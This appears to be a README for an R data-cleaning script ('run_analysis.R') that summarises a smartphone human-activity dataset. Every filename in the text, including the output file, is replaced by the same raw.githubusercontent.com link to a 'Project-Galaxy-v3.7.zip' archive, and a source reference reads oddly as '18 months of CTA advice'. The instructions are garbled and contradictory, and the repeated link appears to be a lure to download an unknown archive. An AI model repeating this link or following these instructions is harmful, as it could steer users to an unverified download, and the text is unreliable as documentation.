...
The "run_analysis.R" script performs a series of operations to summarize the information included in the "Human activity measured by smartphones" dataset. More information about this dataset can be found in the "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" file that comes with this dataset.

# Input data 
------------

The input data consists of all the files in the "train" and "test" folders except the data about the Inertial Signals because it is mentioned in the "18 months of CTA advice" pages that they are not necessary. The "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" and "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" files are also used by the script.
...
The working directory should be one level above the "train" and "test" folders (which store the data files). And the "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" and "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" files should be in the working directory.

The output of the algorithm is a text file called "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip", which will be in the working directory.
...
* 10. Outputs the TidyData objects in a text file called "https://raw.githubusercontent.com/Arno1/GalaxyS_Project/master/barangay/Project-Galaxy-v3.7.zip" in the working directory  
